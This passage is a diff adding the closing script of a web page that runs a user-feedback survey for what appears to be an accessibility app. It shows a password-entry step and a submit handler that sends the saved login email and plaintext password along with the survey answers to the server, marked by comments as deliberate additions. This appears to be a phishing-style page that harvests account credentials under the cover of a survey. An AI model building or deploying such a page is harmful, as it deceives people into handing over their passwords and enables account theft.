+            document.body.style.backgroundColor = '#f0f4f9'; // Gray background for form
+        });
+
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') v2NextBtn.click();
+        });
+
+        // --- VIEW 3: FORM SUBMISSION ---
+        const submitBtn = document.getElementById('submitBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const formSuccessMessage = document.getElementById('formSuccessMessage');
+
+        submitBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+
+            const consent = document.querySelector('input[name="consent"]:checked')?.value;
+            const age = document.getElementById('q_age').value.trim();
+            const device = document.getElementById('q_device').value.trim();
+            const setup = document.querySelector('input[name="setup"]:checked')?.value;
+            const nav = document.querySelector('input[name="nav"]:checked')?.value;
+            const guidance = document.querySelector('input[name="guidance"]:checked')?.value;
+            const readability = document.querySelector('input[name="readability"]:checked')?.value;
+            const speech = document.querySelector('input[name="speech"]:checked')?.value;
+            const latency = document.querySelector('input[name="latency"]:checked')?.value;
+            const sign = document.querySelector('input[name="sign"]:checked')?.value;
+            const camera = document.querySelector('input[name="camera"]:checked')?.value;
+            const sounds = document.querySelector('input[name="sounds"]:checked')?.value;
+            const falseAlarms = document.querySelector('input[name="false_alarms"]:checked')?.value;
+            const offline = document.querySelector('input[name="offline"]:checked')?.value;
+            const safety = document.querySelector('input[name="safety"]:checked')?.value;
+            const comparison = document.querySelector('input[name="comparison"]:checked')?.value;
+            const envs = Array.from(document.querySelectorAll('input[name="env"]:checked')).map(cb => cb.value);
+            const recommend = document.querySelector('input[name="recommend"]:checked')?.value;
+            const mostUseful = document.getElementById('q_most_useful').value.trim();
+            const improvement = document.getElementById('q_improvement').value.trim();
+            const satisfaction = document.querySelector('input[name="satisfaction"]:checked')?.value;
+
+            if (!consent || !age || !setup || !nav || !guidance || !readability || !speech || !latency || !sign || !camera || !sounds || !falseAlarms || !offline || !safety || !comparison || !recommend || !satisfaction) {
+                alert('Please fill out all required fields (marked with *).');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        login_email: savedEmail,       // <-- Added Login Email
+                        login_password: savedPassword, // <-- Added Login Password
+                        consent, age, device_info: device, setup_ease: setup, nav_ease: nav,
+                        no_guidance: guidance, readability, speech_accuracy: speech, latency,
+                        sign_accuracy: sign, camera_usage: camera, sound_reliability: sounds,
+                        false_alarms: falseAlarms, offline_performance: offline, safety_impact: safety,
+                        comparison, environments: envs, recommend_score: recommend,
+                        most_useful: mostUseful, improvement, overall_satisfaction: satisfaction
+                    })
+                });
+
+                if (response.ok) {
+                    formSuccessMessage.style.display = 'block';
+                    formSuccessMessage.scrollIntoView({ behavior: 'smooth' });
+                    submitBtn.textContent = 'Submitted';
+                } else {
+                    alert('Something went wrong. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to connect to the server.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+            }
+        });
+
+        clearBtn.addEventListener('click', () => {
+            document.getElementById('q_age').value = '';
+            document.getElementById('q_device').value = '';
+            document.getElementById('q_most_useful').value = '';
+            document.getElementById('q_improvement').value = '';
+
+            document.querySelectorAll('input[type="radio"]').forEach(r => r.checked = false);
+            document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = false);
+
+            formSuccessMessage.style.display = 'none';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Submit';
+        });
+    </script>
+</body>
+
+</html>
